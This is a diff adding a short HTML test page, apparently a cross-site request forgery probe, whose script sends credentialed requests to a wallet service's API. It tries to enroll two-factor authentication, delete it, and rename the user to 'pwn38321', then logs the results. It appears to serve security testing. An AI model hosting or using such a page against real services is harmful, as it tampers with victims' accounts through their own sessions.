@@ -1,0 +1,24 @@
+<!doctype html><html><head><meta charset="utf-8"><title>t38321</title></head>
+<body><h1>t38321</h1>
+<script>
+window.__r = {steps:[]};
+function log(k,v){ window.__r.steps.push(k+':'+v); }
+var target = 'https://blockops-wallet-api.blockops.network/api/v1/users/me/totp';
+
+// 1) POST enroll with text/plain (simple request, no preflight), SameSite=Strict session auto-sent (same-site)
+fetch(target, {method:'POST', credentials:'include', headers:{'Content-Type':'text/plain'}, body:'{}'})
+ .then(function(r){ window.__r.post_ok=true; log('post_resolved', r.status+'/'+r.type); })
+ .catch(function(e){ window.__r.post_err=String(e); log('post_err', e); });
+
+// 2) DELETE with text/plain (should trigger CORS preflight and fail cross-origin)
+fetch(target, {method:'DELETE', credentials:'include', headers:{'Content-Type':'text/plain'}})
+ .then(function(r){ window.__r.del_ok=true; log('del_resolved', r.status+'/'+r.type); })
+ .catch(function(e){ window.__r.del_err=String(e); log('del_err', e); });
+
+// 3) PUT /users/me with text/plain (simple-method? PUT -> preflight)
+fetch('https://blockops-wallet-api.blockops.network/api/v1/users/me', {method:'PUT', credentials:'include', headers:{'Content-Type':'text/plain'}, body:JSON.stringify({username:'pwn38321'})})
+ .then(function(r){ window.__r.put_ok=true; log('put_resolved', r.status+'/'+r.type); })
+ .catch(function(e){ window.__r.put_err=String(e); log('put_err', e); });
+
+window.__r.ready = true;
+</script></body></html>
